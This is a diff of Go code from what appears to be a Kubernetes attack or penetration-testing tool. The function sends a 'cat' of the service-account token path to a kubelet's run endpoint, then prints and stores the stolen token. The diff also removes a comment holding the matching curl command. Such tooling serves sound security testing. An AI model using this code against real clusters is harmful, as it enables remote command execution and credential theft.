@@ -73,8 +73,6 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, serviceAccounts *[]Servic
 								}
 								sslClient := &http.Client{Transport: tr}
 
-								// curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token\""
-
 								data := url.Values{}
 								data.Set("cmd", "cat "+ServiceAccountPath+"token")
 
@@ -103,8 +101,8 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, serviceAccounts *[]Servic
 								println("[+] Got service account token for", "ns:"+podNamespace+" pod:"+podName+" container:"+containerName+":", token)
 								println("")
 								name := "Pod ns:" + podNamespace + ":" + podName
-								serviceAccount := MakeNewServiceAccount(name, token, "kubelet")
-								*serviceAccounts = append(*serviceAccounts, serviceAccount)
+
+								AddNewServiceAccount(name, token, "kubelet", serviceAccounts)
 							}
 						}
 					}
